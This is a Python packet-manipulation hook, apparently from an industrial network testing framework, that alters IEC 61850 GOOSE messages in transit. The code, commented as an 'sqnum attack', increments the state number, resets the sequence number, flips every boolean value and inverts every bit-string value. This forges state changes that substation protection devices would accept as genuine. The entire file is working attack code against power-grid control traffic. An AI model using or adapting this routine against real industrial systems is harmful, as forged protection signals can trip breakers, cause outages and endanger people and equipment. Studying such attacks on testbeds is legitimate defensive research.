#This where your code is run on the packet's recieved

from .aSDIP_Header import LFC
import pyshark

# to change a piece of data, you need to create a new object and assign it to the field
# the LFC(str) function is provided to do that
# an example:

#   #variable change assigned object with string "8000" passed through 
#   #i.e change it to an IP type packet
#   inpacket.eth.type_raw[0].raw_data=LFC("8000")

def yourcode(inpacket):  
    #sqnum attack
    #print("Original stNum " + inpacket.goose.goosePdu_element.stNum_raw[0])
    c=int(inpacket.goose.goosePdu_element.stNum_raw[0],16)+1 ##convert to int to increment
    c=format(c,'x') #format back to hex

    d=""
    for i in range(0,len(inpacket.goose.goosePdu_element.stNum_raw[0])-len(str(c))):
        d+="0" ##this padds with zeros based on length
    d+=str(c) #finishes off the string


    inpacket.goose.goosePdu_element.stNum_raw[0]=LFC(d)
    #print("New stNum " + inpacket.goose.goosePdu_element.stNum_raw[0])

    c=int(0) ##convert to int to increment
    c=format(c,'x') #format back to hex

    d=""
    for i in range(0,len(inpacket.goose.goosePdu_element.sqNum_raw[0])-len(str(c))):
        d+="0" ##this padds with zeros based on length
    d+=str(c) #finishes off the string


    inpacket.goose.goosePdu_element.sqNum_raw[0]=LFC(d)
    #print("New sqNum " + inpacket.goose.goosePdu_element.sqNum_raw[0])

    #print(inpacket.goose)
    counter=0
    for element in inpacket.goose.goosePdu_element.allData_tree.Data:
        if (element=='3'):
            if(inpacket.goose.goosePdu_element.allData_tree.Data_raw[counter][0]=='00'):
                  inpacket.goose.goosePdu_element.allData_tree.Data_raw[counter][0]=LFC('11')  
            else:
                inpacket.goose.goosePdu_element.allData_tree.Data_raw[counter][0]=LFC('00')

        elif (element=='4'):
            bitxor=0
            datalength=int(inpacket.goose.goosePdu_element.allData_tree.Data_tree[counter].bit_string_raw[2])
            for i in range(datalength):
                bitxor+=(0xff<<(8*i))

            data=int(inpacket.goose.goosePdu_element.allData_tree.Data_tree[counter].bit_string_raw[0].raw_value,16)^bitxor
            padding=int(inpacket.goose.goosePdu_element.allData_tree.Data_tree[counter].padding_raw[0].raw_value)
            for i in range(0,padding):
                data=data^(pow(2,i))
            data=format(data,'x')
            if (data=='0'):
                data=''
                for i in range(datalength):
                    data+='00'
            data=inpacket.goose.goosePdu_element.allData_tree.Data_tree[counter].padding_raw[0].raw_value+data
            #print(inpacket.goose.goosePdu_element.allData_tree.Data_raw[counter][0])
            inpacket.goose.goosePdu_element.allData_tree.Data_raw[counter][0]=LFC(data)  
    

        counter+=1

    

    return 